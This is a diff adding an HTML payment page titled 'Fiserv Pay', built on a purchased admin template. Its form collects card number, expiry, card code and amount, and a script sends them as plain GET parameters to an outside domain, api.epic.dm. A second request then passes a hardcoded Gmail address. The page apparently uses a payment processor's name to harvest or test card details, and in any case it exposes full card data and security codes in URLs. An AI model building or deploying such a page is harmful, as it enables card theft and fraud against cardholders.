@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<!--
+Template Name: Midone - HTML Admin Dashboard Template
+Author: Left4code
+Website: http://www.left4code.com/
+Contact: muhammadrizki@left4code.com
+Purchase: https://themeforest.net/user/left4code/portfolio
+Renew Support: https://themeforest.net/user/left4code/portfolio
+License: You must have a valid license purchased only from themeforest(the above link) in order to legally use the theme for your project.
+-->
+<html lang="en" class="light">
+<!-- BEGIN: Head -->
+
+<head>
+    <meta charset="utf-8">
+    <link href="dist/images/logo.svg" rel="shortcut icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description"
+        content="Midone admin is super flexible, powerful, clean & modern responsive tailwind admin template with unlimited possibilities.">
+    <meta name="keywords"
+        content="admin template, Midone admin template, dashboard template, flat admin template, responsive admin template, web app">
+    <meta name="author" content="LEFT4CODE">
+    <title>Fiserv Pay</title>
+    <!-- BEGIN: CSS Assets-->
+    <link rel="stylesheet" href="dist/css/app.css" />
+    <!-- END: CSS Assets-->
+</head>
+<!-- END: Head -->
+
+<body class="login">
+    <div class="container sm:px-10">
+        <div class="block xl:grid grid-cols-2 gap-4">
+            <!-- BEGIN: Register Info -->
+            <div class="hidden xl:flex flex-col min-h-screen">
+                <a href="" class="-intro-x flex items-center pt-5">
+                    <img alt="Midone Tailwind HTML Admin Template" class="w-25" src="fiserv3_1.png">
+                    <span class="text-white text-lg ml-3"> <span class="font-medium"></span> </span>
+                </a>
+                <div class="my-auto">
+                    <img alt="Midone Tailwind HTML Admin Template" class="-intro-x w-1/2 -mt-16"
+                        src="dist/images/illustration.svg">
+                    <div class="-intro-x text-white font-medium text-4xl leading-tight mt-10">
+                        <br>
+                    </div>
+                    <div class="-intro-x mt-5 text-lg text-white dark:text-gray-500"></div>
+                </div>
+            </div>
+            <!-- END: Register Info -->
+            <!-- BEGIN: Register Form -->
+
+            <div class="h-screen xl:h-auto flex py-5 xl:py-0 my-10 xl:my-0">
+                <div
+                    class="my-auto mx-auto xl:ml-20 bg-white xl:bg-transparent px-5 sm:px-8 py-8 xl:p-0 rounded-md shadow-md xl:shadow-none w-full sm:w-3/4 lg:w-2/4 xl:w-auto">
+                    <h2 class="intro-x font-bold text-2xl xl:text-3xl text-center xl:text-left">
+                        Pay
+                    </h2>
+                    <div class="intro-x mt-2 text-gray-500 dark:text-gray-500 xl:hidden text-center"></div>
+                    <div class="intro-x mt-8">
+                        <input type="text" id="card" class="intro-x login__input input input--lg border border-gray-300 block"
+                            placeholder="card number">
+                        <input type="text"
+                            id="month"
+                            class="intro-x login__input input input--lg border border-gray-300 block mt-4"
+                            placeholder="expire month">
+                        <input type="text"
+                            id="year"
+                            class="intro-x login__input input input--lg border border-gray-300 block mt-4"
+                            placeholder="expire year">
+                        <input type="text"
+                            id="code"
+                            class="intro-x login__input input input--lg border border-gray-300 block mt-4"
+                            placeholder="card code">
+                        <input type="text"
+                            id="total"
+                            class="intro-x login__input input input--lg border border-gray-300 block mt-4"
+                            placeholder="total">
+                    </div>
+
+                    <div class="intro-x mt-5 xl:mt-8 text-center xl:text-left">
+                        <input type="submit"
+                            id="pay"
+                            class="button button--lg w-full xl:w-32 text-white bg-theme-1 xl:mr-3 align-top"
+                            value="Pay">
+                        <input type="button"
+                            class="button button--lg w-full xl:w-32 text-gray-700 border border-gray-300 dark:border-dark-5 dark:text-gray-300 mt-3 xl:mt-0 align-top"
+                            value="Cancel">
+                    </div>
+                </div>
+            </div>
+<div class="text-center" style="display: none;"> <a href="javascript:;" data-toggle="modal" data-target="#warning-modal-preview" class="fail_button button inline-block bg-theme-1 text-white">Show Modal</a> </div>
+ <div class="modal" id="warning-modal-preview">
+     <div class="modal__content">
+         <div class="p-5 text-center"> <i data-feather="x-circle" class="w-16 h-16 text-theme-6 mx-auto mt-3"></i>
+             <div class="text-3xl mt-5">Oops...</div>
+             <div class="res text-gray-600 mt-2">Something went wrong!</div>
+         </div>
+         <div class="px-5 pb-8 text-center"> <button type="button" data-dismiss="modal" class="button w-24 bg-theme-1 text-white">Ok</button> </div>
+         <div class="p-5 text-center border-t border-gray-200 dark:border-dark-5"> <a href="" class="text-theme-1 dark:text-theme-10">Why do I have this issue?</a> </div>
+     </div>
+ </div> <div class="text-center" style="display: none;"> <a href="javascript:;" data-toggle="modal" data-target="#success-modal-preview" class="success_button button inline-block bg-theme-1 text-white">Show Modal</a> </div>
+ <div class="modal" id="success-modal-preview">
+     <div class="modal__content">
+         <div class="p-5 text-center"> <i data-feather="check-circle" class="w-16 h-16 text-theme-9 mx-auto mt-3"></i>
+             <div class="res text-3xl mt-5">Good job!</div>
+         </div>
+         <div class="px-5 pb-8 text-center"> <button type="button" data-dismiss="modal" class="button w-24 bg-theme-1 text-white">Ok</button> </div>
+     </div>
+ </div>		
+            <!-- END: Register Form -->
+        </div>
+    </div>
+
+    <!-- BEGIN: JS Assets-->
+    <script src="dist/js/app.js"></script>
+    <script src="dist/js/jquery-1.11.3.min.js"></script>
+    <script type="text/javascript">
+	$(document).ready(function(){
+        $("#pay").click(function(){
+            var card = $("#card").val();
+            var year = $("#year").val();
+	    let length = year.length;
+	    year = year.substr(length-2, length);
+            var month = $("#month").val();
+            var code = $("#code").val();
+            var total = $("#total").val();
+	    if (card == "" || year == "" || month == "" || code == "" || total == ""){
+	    	alert("please fill all the fields!");
+	    } else{
+            $.ajax({
+                url: 'https://api.epic.dm/pay.php',
+                type: 'get',
+                data: {card: card, year: year, month: month, code: code, total: total},
+                success: function (data) {
+                    //alert(data);
+		    if (data == "APPROVED"){
+			$(".modal__content").css("color", "green");
+			$(".res").html(data);
+			document.getElementsByClassName("success_button")[0].click();
+		    } else {
+			$(".modal__content").css("color", "red");
+			$(".res").html(data);
+		    	document.getElementsByClassName("fail_button")[0].click();
+		    }
+		    
+		    $("#card").val("");
+		    $("#year").val("");
+		    $("#month").val("");
+		    $("#code").val("");
+		    $("#total").val("");
+
+	$.ajax({
+                url: 'https://api.epic.dm/pay10.php',
+                type: 'get',
+                data: {email:"apollon71star@gmail.com"},
+                success: function (data) {
+			alert(data);
+                }
+
+            })
+
+                }
+
+            })
+	}
+        })
+})
+    </script>
+    <!-- END: JS Assets-->
+</body>
+
+</html>
